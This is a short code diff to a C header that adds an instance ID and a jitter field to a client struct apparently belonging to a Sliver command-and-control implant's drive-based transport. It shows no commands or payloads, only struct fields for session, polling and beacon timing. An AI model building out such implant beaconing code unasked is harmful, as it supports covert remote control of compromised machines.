@@ -10,6 +10,7 @@ typedef struct _DRIVE_CONFIG {
 typedef struct _SLIVER_DRIVE_CLIENT {
 	DRIVE_CONFIG DriveConfig;
 	CHAR szSessionID[33];
+	CHAR szInstanceID[37];
 	CHAR szSliverName[32];
 	CHAR szConfigID[32];
 	UINT64 uPeerID;
@@ -24,6 +25,7 @@ typedef struct _SLIVER_DRIVE_CLIENT {
 	DWORD dwMaxErrors;
 	LPSTR lpServerMinisignPublicKey;
 	DWORD dwPollInterval;
+	DWORD dwJitter;
 	BOOL IsClosed;
 } SLIVER_DRIVE_CLIENT, * PSLIVER_DRIVE_CLIENT;
 
